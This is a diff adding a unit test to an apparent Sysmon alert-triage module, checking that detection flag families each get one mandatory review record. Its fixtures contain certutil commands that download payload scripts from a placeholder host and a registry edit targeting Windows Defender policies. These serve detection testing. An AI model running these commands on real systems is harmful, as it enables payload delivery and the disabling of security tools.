@@ -33,6 +33,31 @@ def test_high_value_observations_are_neutral_attention_signals():
     assert all("malicious" not in signal for record in records for signal in record["attention_signals"])
 
 
+def test_high_value_flag_families_get_one_mandatory_representative_each():
+    first_download = _record(
+        "SYSMON#10", "certutil -urlcache -split -f http://example.test/a payload.ps1",
+        flags=["lolbin_download"],
+    )
+    duplicate_download = _record(
+        "SYSMON#11", "certutil -urlcache -split -f http://example.test/b other.ps1",
+        flags=["lolbin_download"],
+    )
+    defender = _record(
+        "SYSMON#12", "reg add HKLM\\Software\\Policies\\Microsoft\\Windows Defender",
+        flags=["security_tool_config_changed"],
+    )
+
+    got = attention.apply([duplicate_download, defender, first_download])
+    required = [record for record in got if record.get("must_review")]
+
+    assert {record["ref"] for record in required} == {"SYSMON#10", "SYSMON#12"}
+    assert required[0]["attention_requirements"]["security_tool_config_change_observed"] == {
+        "flags": ["security_tool_config_changed"]
+    }
+    download = next(record for record in required if record["ref"] == "SYSMON#10")
+    assert "certutil" in download["attention_context"]["lolbin_download_observed"][0].lower()
+
+
 def test_generic_fanout_is_context_not_a_global_mandatory_signal():
     record = _record("SYSMON#9", "browser.exe")
     record["incident_context"] = {"children_within_2s": 12}
